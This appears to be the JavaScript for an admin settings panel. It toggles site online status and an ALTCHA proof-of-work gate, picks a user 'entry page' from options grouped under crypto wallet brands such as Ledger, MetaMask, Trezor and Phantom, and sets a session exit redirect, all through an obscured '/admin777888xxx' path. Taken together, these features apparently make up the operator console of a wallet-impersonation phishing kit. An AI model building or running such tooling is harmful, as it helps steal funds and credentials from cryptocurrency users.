var started = false;
var siteOnline = true;
var powEnabled = true;

var bootApplied = false;
var platformDirty = false;
var powDirty = false;

var entryDesired = null;
var entryConfirmed = null;
var entryInFlight = false;
var entryTouched = false;

var exitDesired = '';
var exitConfirmed = null;
var exitInFlight = false;
var exitTimer = null;
var exitTouched = false;

var GROUP_ICONS = {
    'Ledger':   '<img src="/ledger2logo.png" class="ep-group-icon" style="width:14px;height:14px;object-fit:contain;vertical-align:middle;">',
    'Coinbase': '<img src="/Coinbaselogo.png" class="ep-group-icon" style="width:14px;height:14px;object-fit:contain;vertical-align:middle;">',
    'MetaMask': '<svg class="ep-group-icon" viewBox="0 0 35 33" fill="none"><path d="M32.958 1L19.44 10.94l2.44-5.763L32.958 1z" fill="#E17726" stroke="#E17726" stroke-width=".25"/><path d="M2.042 1l13.406 10.03-2.322-5.853L2.042 1z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M28.183 23.534l-3.596 5.505 7.694 2.117 2.208-7.496-6.306-.126z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M.56 23.66l2.193 7.496 7.679-2.117-3.582-5.505L.56 23.66z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M10.044 14.903l-2.148 3.248 7.647.345-.255-8.224-5.244 4.63z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M24.956 14.903l-5.317-4.72-.174 8.313 7.638-.345-2.147-3.248z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M10.432 29.04l4.614-2.238-3.978-3.101-.636 5.338z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M19.954 26.8l4.598 2.24-.621-5.338-3.977 3.097z" fill="#E27625" stroke="#E27625" stroke-width=".25"/></svg>',
    'Exodus':   '<svg class="ep-group-icon" viewBox="0 0 60 60" fill="none"><path d="M59.64 16.75L34.09 0V9.37L50.48 20.02L48.55 26.12H34.09V33.88H48.55L50.48 39.98L34.09 50.63V60L59.64 43.3L55.46 30.03L59.64 16.75Z" fill="url(#exg1)"/><path d="M11.86 33.88H26.27V26.12H11.81L9.93 20.02L26.27 9.37V0L0.72 16.75L4.9 30.03L0.72 43.3L26.32 60V50.63L9.93 39.98L11.86 33.88Z" fill="url(#exg2)"/><defs><linearGradient id="exg1" x1="51" x2="34" y1="64" y2="-7" gradientUnits="userSpaceOnUse"><stop stop-color="#0B46F9"/><stop offset="1" stop-color="#BBFBE0"/></linearGradient><linearGradient id="exg2" x1="51" x2="34" y1="64" y2="-7" gradientUnits="userSpaceOnUse"><stop stop-color="#0B46F9"/><stop offset="1" stop-color="#BBFBE0"/></linearGradient></defs></svg>',
    'Phantom':  '<svg class="ep-group-icon" viewBox="0 0 24 24" fill="none"><path fill="#AB9FF2" fill-rule="evenodd" d="M9.78 16.95c-1.26 1.928-3.37 4.37-6.177 4.37C2.276 21.32 1 20.774 1 18.4 1 12.356 9.252 3 16.909 3 21.265 3 23 6.022 23 9.454c0 4.405-2.858 9.442-5.7 9.442-.902 0-1.344-.496-1.344-1.281 0-.205.034-.427.102-.666-.97 1.656-2.841 3.193-4.594 3.193-1.276 0-1.923-.802-1.923-1.93 0-.41.085-.836.239-1.263m6.595-7.615c0 1-.59 1.5-1.25 1.5-.67 0-1.25-.5-1.25-1.5s.58-1.5 1.25-1.5c.66 0 1.25.5 1.25 1.5m3.75 0c0 1-.59 1.5-1.25 1.5-.67 0-1.25-.5-1.25-1.5s.58-1.5 1.25-1.5c.66 0 1.25.5 1.25 1.5" clip-rule="evenodd"/></svg>',
    'Ellipal': '<svg class="ep-group-icon" viewBox="0 0 24 24" fill="none"><path fill="#4366D0" d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2zm0 2a8 8 0 100 16 8 8 0 000-16zm1.5 6.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zm4 0a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM12 14.5c.825 0 1.574.334 2.113.873A2.985 2.985 0 0115 17.5h-6a2.985 2.985 0 01.887-2.127c.539-.539 1.288-.873 2.113-.873z"/></svg>',
    'Trezor':  '<svg class="ep-group-icon" viewBox="0 0 24 24" fill="none"><path fill="#01B757" d="M12 2L4 5.5v5C4 15 7.5 19.5 12 22c4.5-2.5 8-7 8-11.5v-5L12 2zm0 2.3l6 2.7v4.5c0 3.5-2.6 7-6 9.2-3.4-2.2-6-5.7-6-9.2V7l6-2.7zm0 3.2a2.5 2.5 0 00-1 4.8V15h2v-2.7a2.5 2.5 0 00-1-4.8z"/></svg>'
};

function csrf() {
    var m = document.querySelector('meta[name="csrf-token"]');
    return m ? m.content : '';
}

function escapeHtml(t) {
    var d = document.createElement('div');
    d.textContent = t;
    return d.innerHTML;
}

function controlOf(el) {
    var node = el && el.closest ? el.closest('[data-settings-control]') : null;
    return node || null;
}

function updateOfflineBanner() {
    var banner = document.getElementById('offline-session-banner');
    if (banner) banner.style.display = siteOnline ? 'none' : 'block';
}

function updateSiteStatusUI() {
    var liveText = document.getElementById('site-live-label');
    var dot = document.getElementById('site-status-dot');
    var sWord = document.getElementById('settings-status-word');
    var sDesc = document.getElementById('settings-status-desc');
    var toggle = document.getElementById('platform-toggle');
    var liveTextFlows = document.getElementById('site-live-label-flows');

    if (siteOnline) {
        if (liveText) { liveText.textContent = 'ONLINE'; liveText.className = 'text-[10px] text-green-400 font-mono'; }
        if (liveTextFlows) { liveTextFlows.textContent = 'ONLINE'; liveTextFlows.className = 'text-[10px] text-green-400 font-mono'; }
        if (dot) { dot.className = 'w-1.5 h-1.5 rounded-full bg-green-400 pulse-dot'; }
        if (sWord) { sWord.textContent = 'online'; sWord.className = 'text-green-400 font-medium'; }
        if (sDesc) sDesc.innerHTML = 'The platform is currently <span id="settings-status-word" class="text-green-400 font-medium">online</span>. Users can access all pages normally.';
        if (toggle) toggle.checked = true;
    } else {
        if (liveText) { liveText.textContent = 'OFFLINE'; liveText.className = 'text-[10px] text-gray-500 font-mono'; }
        if (liveTextFlows) { liveTextFlows.textContent = 'OFFLINE'; liveTextFlows.className = 'text-[10px] text-gray-500 font-mono'; }
        if (dot) { dot.className = 'w-1.5 h-1.5 rounded-full bg-gray-600'; }
        if (sDesc) sDesc.innerHTML = 'The platform is currently <span id="settings-status-word" class="text-red-400 font-medium">offline</span>. Users are shown the maintenance page.';
        if (toggle) toggle.checked = false;
    }
}

function updatePowUI() {
    var toggle = document.getElementById('pow-toggle');
    var word = document.getElementById('pow-status-word');
    var desc = document.getElementById('pow-desc');
    if (toggle) toggle.checked = powEnabled;
    if (word) { word.textContent = powEnabled ? 'enabled' : 'disabled'; word.className = powEnabled ? 'text-green-400 font-medium' : 'text-red-400 font-medium'; }
    if (desc) desc.innerHTML = 'PoW is currently <span id="pow-status-word" class="' + (powEnabled ? 'text-green-400' : 'text-red-400') + ' font-medium">' + (powEnabled ? 'enabled' : 'disabled') + '</span>. User automatically must solve a ALTCHA proof of work before entering platform!';
}

function revertPlatform(sending) {
    if (siteOnline !== sending) return;
    siteOnline = !sending;
    updateSiteStatusUI();
    updateOfflineBanner();
}

function persistPlatform() {
    var sending = siteOnline;
    fetch('/admin777888xxx/site-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf() },
        body: JSON.stringify({ online: sending })
    }).then(function (r) { return r.json(); }).then(function (d) {
        if (!d.ok) revertPlatform(sending);
    }).catch(function () { revertPlatform(sending); });
}

function revertPow(sending) {
    if (powEnabled !== sending) return;
    powEnabled = !sending;
    updatePowUI();
}

function persistPow() {
    var sending = powEnabled;
    fetch('/admin777888xxx/pow-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf() },
        body: JSON.stringify({ enabled: sending })
    }).then(function (r) { return r.json(); }).then(function (d) {
        if (!d.ok) revertPow(sending);
    }).catch(function () { revertPow(sending); });
}

function closeEntryPicker() {
    var trig = document.getElementById('ep-trigger');
    var dd = document.getElementById('ep-dropdown');
    if (trig) trig.classList.remove('open');
    if (dd) dd.classList.remove('open');
    window.removeEventListener('scroll', repositionEntryPicker, true);
    window.removeEventListener('resize', repositionEntryPicker);
}

function repositionEntryPicker() {
    var trig = document.getElementById('ep-trigger');
    var dd = document.getElementById('ep-dropdown');
    if (!trig || !dd || !dd.classList.contains('open')) return;
    var rect = trig.getBoundingClientRect();
    dd.style.top = (rect.bottom + 4) + 'px';
    dd.style.left = rect.left + 'px';
    dd.style.width = rect.width + 'px';
}

function toggleEntryPicker() {
    var trig = document.getElementById('ep-trigger');
    var dd = document.getElementById('ep-dropdown');
    if (!trig || !dd) return;
    var isOpen = trig.classList.toggle('open');
    dd.classList.toggle('open');
    if (isOpen) {
        repositionEntryPicker();
        window.addEventListener('scroll', repositionEntryPicker, true);
        window.addEventListener('resize', repositionEntryPicker);
    } else {
        window.removeEventListener('scroll', repositionEntryPicker, true);
        window.removeEventListener('resize', repositionEntryPicker);
    }
}

function applyEntryUi(url, label) {
    var sel = document.getElementById('entry-page-select');
    var trig = document.getElementById('ep-trigger');
    var dd = document.getElementById('ep-dropdown');
    var trigLabel = document.getElementById('ep-trigger-label');
    var trigUrl = document.getElementById('ep-trigger-url');
    if (sel) sel.value = url;
    if (trigLabel) trigLabel.textContent = label;
    if (trigUrl) trigUrl.textContent = url;
    if (trig) trig.classList.remove('open');
    if (dd) dd.classList.remove('open');
    document.querySelectorAll('.ep-option').forEach(function (opt) {
        var chk = opt.querySelector('.ep-opt-check');
        if (chk) {
            if (opt.dataset.url === url) {
                opt.classList.add('selected');
                chk.textContent = '"';
            } else {
                opt.classList.remove('selected');
                chk.textContent = '';
            }
        }
    });
}

function entryLabelFor(url) {
    var found = '';
    document.querySelectorAll('.ep-option').forEach(function (opt) {
        if (opt.dataset.url === url) found = opt.dataset.label || '';
    });
    return found;
}

function revertEntry(sending) {
    if (entryDesired !== sending) return;
    entryDesired = entryConfirmed;
    if (entryConfirmed) applyEntryUi(entryConfirmed, entryLabelFor(entryConfirmed));
}

function kickEntry() {
    if (!bootApplied) return;
    if (entryInFlight) return;
    if (!entryDesired) return;
    if (entryDesired === entryConfirmed) return;
    entryInFlight = true;
    var sending = entryDesired;
    fetch('/admin777888xxx/entry-page', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf() },
        body: JSON.stringify({ url: sending })
    }).then(function (r) { return r.json(); }).then(function (d) {
        if (d.ok) {
            entryConfirmed = sending;
        } else {
            revertEntry(sending);
        }
    }).catch(function () {
        revertEntry(sending);
    }).finally(function () {
        entryInFlight = false;
        if (entryDesired && entryDesired !== sending) kickEntry();
    });
}

function selectEntry(url, label) {
    if (!url) return;
    applyEntryUi(url, label);
    entryTouched = true;
    entryDesired = url;
    kickEntry();
}

function revertExit(sending) {
    if ((exitDesired || '').trim() !== sending) return;
    exitDesired = exitConfirmed == null ? '' : exitConfirmed;
    var eu = document.getElementById('exit-url');
    if (eu) eu.value = exitDesired;
}

function kickExit() {
    if (!bootApplied) return;
    if (exitTimer) {
        clearTimeout(exitTimer);
        exitTimer = null;
    }
    if (exitInFlight) return;
    var url = (exitDesired || '').trim();
    if (url) {
        try { new URL(url); } catch (e) {
            return;
        }
    }
    if (url === exitConfirmed) return;
    exitInFlight = true;
    var sending = url;
    fetch('/admin777888xxx/session-exit-url', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf() },
        body: JSON.stringify({ url: sending })
    }).then(function (r) {
        if (!r.ok) {
            return r.text().then(function (t) {
                try {
                    var e = JSON.parse(t);
                    throw new Error(e.error || e.message || JSON.stringify(e.errors) || 'Server error ' + r.status);
                } catch (je) {
                    if (je instanceof Error && je.message && je.message.indexOf('Server error') === 0) throw je;
                    throw new Error('Server error ' + r.status + ': ' + t.substring(0, 200));
                }
            });
        }
        return r.json();
    }).then(function (d) {
        if (d.ok) {
            exitConfirmed = sending;
        } else {
            revertExit(sending);
        }
    }).catch(function () {
        revertExit(sending);
    }).finally(function () {
        exitInFlight = false;
        if ((exitDesired || '').trim() !== sending) kickExit();
    });
}

function scheduleExit(immediate) {
    if (exitTimer) {
        clearTimeout(exitTimer);
        exitTimer = null;
    }
    if (immediate) {
        kickExit();
        return;
    }
    exitTimer = setTimeout(function () {
        exitTimer = null;
        kickExit();
    }, 400);
}

function populateEntryPicker(pages, active) {
    var dd = document.getElementById('ep-dropdown');
    if (!dd || !pages.length) return;
    dd.innerHTML = '';
    var lastGroup = null;
    pages.forEach(function (p) {
        if (p.group !== lastGroup) {
            lastGroup = p.group;
            var lbl = document.createElement('div');
            lbl.className = 'ep-group-label';
            lbl.innerHTML = (GROUP_ICONS[p.group] || '') + escapeHtml(p.group);
            dd.appendChild(lbl);
        }
        var opt = document.createElement('div');
        opt.className = 'ep-option' + (p.url === active ? ' selected' : '');
        opt.setAttribute('data-settings-control', 'entry-option');
        opt.dataset.url = p.url;
        opt.dataset.label = p.label || '';
        opt.innerHTML = '<span class="ep-opt-label">' + escapeHtml(p.label || '') + '</span>' +
            '<span class="ep-opt-url">' + escapeHtml(p.url || '') + '</span>' +
            '<span class="ep-opt-check">' + (p.url === active ? '"' : '') + '</span>';
        dd.appendChild(opt);
    });
}

function applyBootLanding(pages, active) {
    var sel = document.getElementById('entry-page-select');
    var trigLabel = document.getElementById('ep-trigger-label');
    var trigUrl = document.getElementById('ep-trigger-url');
    var showUrl = (entryTouched && entryDesired) ? entryDesired : active;
    populateEntryPicker(pages, showUrl);
    if (entryTouched || entryInFlight) {
        var desiredItem = pages.find(function (p) { return p.url === entryDesired; });
        if (desiredItem && trigLabel && trigUrl) {
            trigLabel.textContent = desiredItem.label;
            trigUrl.textContent = desiredItem.url;
        }
        if (sel && entryDesired) sel.value = entryDesired;
        return;
    }
    var activeItem = pages.find(function (p) { return p.url === active; });
    if (activeItem && trigLabel && trigUrl) {
        trigLabel.textContent = activeItem.label;
        trigUrl.textContent = activeItem.url;
    }
    if (sel) sel.value = active;
    entryDesired = active;
    entryConfirmed = active;
}

function finishBoot() {
    bootApplied = true;
    if (entryTouched) kickEntry();
    if (exitTouched) kickExit();
}

function loadFlowSettings() {
    fetch('/admin777888xxx/flow-settings')
        .then(function (r) { return r.json(); })
        .then(function (d) {
            if (!platformDirty) {
                siteOnline = d.site_online !== false;
                updateSiteStatusUI();
                updateOfflineBanner();
            }
            if (!powDirty) {
                powEnabled = d.pow_enabled !== false;
                updatePowUI();
            }

            var pages = d.user_pages || [];
            var active = d.entry_page || '/';
            applyBootLanding(pages, active);

            var loadedExit = (d.session_exit_url !== undefined && d.session_exit_url !== null) ? d.session_exit_url : '';
            if (!exitTouched && !exitInFlight) {
                var eu = document.getElementById('exit-url');
                if (eu) eu.value = loadedExit;
                exitDesired = loadedExit;
                exitConfirmed = loadedExit;
            }

            finishBoot();
        }).catch(function () {
            var dd = document.getElementById('ep-dropdown');
            if (dd) {
                var err = document.createElement('div');
                err.style.cssText = 'padding:8px 12px;color:rgba(255,100,100,.8);font-size:11px;text-align:center;';
                err.textContent = 'Failed to load pages  refresh page';
                dd.textContent = '';
                dd.appendChild(err);
            }
            finishBoot();
        });
}

function onChange(e) {
    var node = controlOf(e.target);
    if (!node) return;
    var kind = node.getAttribute('data-settings-control');
    if (kind === 'platform') {
        platformDirty = true;
        siteOnline = !!node.checked;
        updateSiteStatusUI();
        updateOfflineBanner();
        persistPlatform();
    } else if (kind === 'pow') {
        powDirty = true;
        powEnabled = !!node.checked;
        updatePowUI();
        persistPow();
    }
}

function onClick(e) {
    var node = controlOf(e.target);
    if (!node) return;
    var kind = node.getAttribute('data-settings-control');
    if (kind === 'entry-trigger') {
        e.preventDefault();
        toggleEntryPicker();
    } else if (kind === 'entry-option') {
        selectEntry(node.dataset.url || '', node.dataset.label || '');
    }
}

function onInput(e) {
    var node = controlOf(e.target);
    if (!node || node.getAttribute('data-settings-control') !== 'exit-url') return;
    exitTouched = true;
    exitDesired = node.value;
    scheduleExit(false);
}

function onFocusOut(e) {
    var node = controlOf(e.target);
    if (!node || node.getAttribute('data-settings-control') !== 'exit-url') return;
    exitDesired = node.value;
    scheduleExit(true);
}

function onDocClick(e) {
    var picker = document.getElementById('ep-picker');
    if (picker && !picker.contains(e.target)) closeEntryPicker();
}

export function start() {
    if (started) return;
    started = true;

    var root = document.getElementById('view-settings');
    if (root) {
        root.addEventListener('change', onChange);
        root.addEventListener('click', onClick);
        root.addEventListener('input', onInput);
        root.addEventListener('focusout', onFocusOut);
    }
    document.addEventListener('click', onDocClick);

    loadFlowSettings();
}
